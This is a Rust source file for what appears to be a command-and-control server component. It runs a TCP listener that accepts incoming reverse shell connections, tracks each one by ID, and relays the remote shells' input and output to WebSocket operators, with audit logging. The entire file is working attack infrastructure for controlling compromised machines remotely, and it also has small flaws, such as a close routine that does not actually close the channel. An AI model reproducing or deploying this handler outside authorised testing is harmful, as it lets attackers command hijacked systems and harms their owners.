use common::error::C2Result;
use tracing::{error, info};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::{mpsc, broadcast, RwLock};
use std::collections::HashMap;
use uuid::Uuid;
use crate::audit::AuditLogger;

/// Manages active reverse shell connections
pub struct ReverseShellManager {
    connections: Arc<RwLock<HashMap<String, (mpsc::Sender<Vec<u8>>, broadcast::Sender<Vec<u8>>)>>>,
}

impl ReverseShellManager {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(RwLock::new(HashMap::new())),
        }
    }
    
    pub async fn get_connection(&self, connection_id: &str) -> Option<(mpsc::Sender<Vec<u8>>, broadcast::Receiver<Vec<u8>>)> {
        let connections = self.connections.read().await;
        if let Some((tx, broadcast_tx)) = connections.get(connection_id) {
            Some((tx.clone(), broadcast_tx.subscribe()))
        } else {
            None
        }
    }
    
    pub async fn list_connections(&self) -> Vec<String> {
        let connections = self.connections.read().await;
        connections.keys().cloned().collect()
    }
    
    async fn add_connection(&self, connection_id: String, tx: mpsc::Sender<Vec<u8>>, broadcast_tx: broadcast::Sender<Vec<u8>>) {
        let mut connections = self.connections.write().await;
        connections.insert(connection_id, (tx, broadcast_tx));
    }
    
    async fn remove_connection(&self, connection_id: &str) {
        let mut connections = self.connections.write().await;
        connections.remove(connection_id);
    }
    
    pub async fn close_connection(&self, connection_id: &str) -> bool {
        let connections = self.connections.read().await;
        if let Some((tx, _)) = connections.get(connection_id) {
            // Close the mpsc channel to signal disconnection
            drop(tx.clone());
            drop(connections);
            // Remove from the map
            self.remove_connection(connection_id).await;
            true
        } else {
            false
        }
    }
}

/// Global reverse shell manager instance
static mut REVERSE_SHELL_MANAGER: Option<ReverseShellManager> = None;
static INIT: std::sync::Once = std::sync::Once::new();

pub fn get_reverse_shell_manager() -> &'static ReverseShellManager {
    unsafe {
        INIT.call_once(|| {
            REVERSE_SHELL_MANAGER = Some(ReverseShellManager::new());
        });
        REVERSE_SHELL_MANAGER.as_ref().unwrap()
    }
}

/// Starts a TCP listener for reverse shell connections.
/// Each connection gets a unique ID and can be accessed via WebSocket.
pub async fn start_listener(
    port: u16, 
    _shell_manager: Arc<crate::managers::shell_manager::ShellManager>,
    audit_logger: Arc<AuditLogger>
) -> C2Result<()> {
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await?;
    
    // Log listener startup
    audit_logger.log_websocket_event(
        "reverse_shell_listener",
        "START",
        &format!("Reverse shell listener started on port {}", port)
    );
    info!("Reverse shell listener started on port {}", port);

    loop {
        let (socket, peer_addr) = listener.accept().await?;
        let connection_id = Uuid::new_v4().to_string();
        
        // Log new connection
        audit_logger.log_websocket_event(
            &connection_id,
            "CONNECT",
            &format!("Reverse shell connection from: {}", peer_addr)
        );
        info!("Accepted reverse shell connection from: {} (ID: {})", peer_addr, connection_id);

        let audit_logger_clone = audit_logger.clone();
        tokio::spawn(handle_reverse_shell_connection(
            socket, 
            peer_addr.to_string(), 
            connection_id,
            audit_logger_clone
        ));
    }
}

async fn handle_reverse_shell_connection(
    socket: tokio::net::TcpStream,
    peer_addr: String,
    connection_id: String,
    audit_logger: Arc<AuditLogger>,
) {
    let (mut reader, mut writer) = socket.into_split();
    
    // Create channels for this connection
    let (tx_to_shell, mut rx_to_shell) = mpsc::channel::<Vec<u8>>(100);
    let (tx_from_shell, _rx_from_shell) = broadcast::channel::<Vec<u8>>(100);
    
    // Register this connection
    get_reverse_shell_manager().add_connection(connection_id.clone(), tx_to_shell, tx_from_shell.clone()).await;
    
    let connection_id_read = connection_id.clone();
    let connection_id_write = connection_id.clone();
    let tx_from_shell_clone = tx_from_shell.clone();
    let audit_logger_read = audit_logger.clone();
    let audit_logger_write = audit_logger.clone();
    let audit_logger_cleanup = audit_logger.clone();
    
    // Task to read from shell and broadcast to WebSocket listeners
    let read_task = tokio::spawn(async move {
        let mut buf = vec![0; 1024];
        loop {
            match reader.read(&mut buf).await {
                Ok(0) => {
                    // Log disconnection
                    audit_logger_read.log_websocket_event(
                        &connection_id_read,
                        "DISCONNECT",
                        &format!("Reverse shell client disconnected: {}", peer_addr)
                    );
                    info!("Reverse shell client disconnected: {} (ID: {})", peer_addr, connection_id_read);
                    break;
                }
                Ok(n) => {
                    let data = buf[..n].to_vec();
                    // Broadcast shell output to all WebSocket listeners
                    let _ = tx_from_shell_clone.send(data);
                }
                Err(e) => {
                    // Log error
                    audit_logger_read.log_websocket_event(
                        &connection_id_read,
                        "ERROR",
                        &format!("Error reading from reverse shell: {}", e)
                    );
                    error!("Error reading from reverse shell {}: {}", connection_id_read, e);
                    break;
                }
            }
        }
    });
    
    // Task to receive from WebSocket and write to shell
    let write_task = tokio::spawn(async move {
        while let Some(data) = rx_to_shell.recv().await {
            if let Err(e) = writer.write_all(&data).await {
                // Log write error
                audit_logger_write.log_websocket_event(
                    &connection_id_write,
                    "ERROR",
                    &format!("Error writing to reverse shell: {}", e)
                );
                error!("Error writing to reverse shell {}: {}", connection_id_write, e);
                break;
            }
        }
    });
    
    // Wait for either task to complete, then cleanup
    tokio::select! {
        _ = read_task => {},
        _ = write_task => {},
    }
    
    // Remove connection from manager
    get_reverse_shell_manager().remove_connection(&connection_id).await;
    
    // Log cleanup
    audit_logger_cleanup.log_websocket_event(
        &connection_id,
        "CLEANUP",
        "Reverse shell connection cleaned up"
    );
    info!("Cleaned up reverse shell connection: {}", connection_id);
}
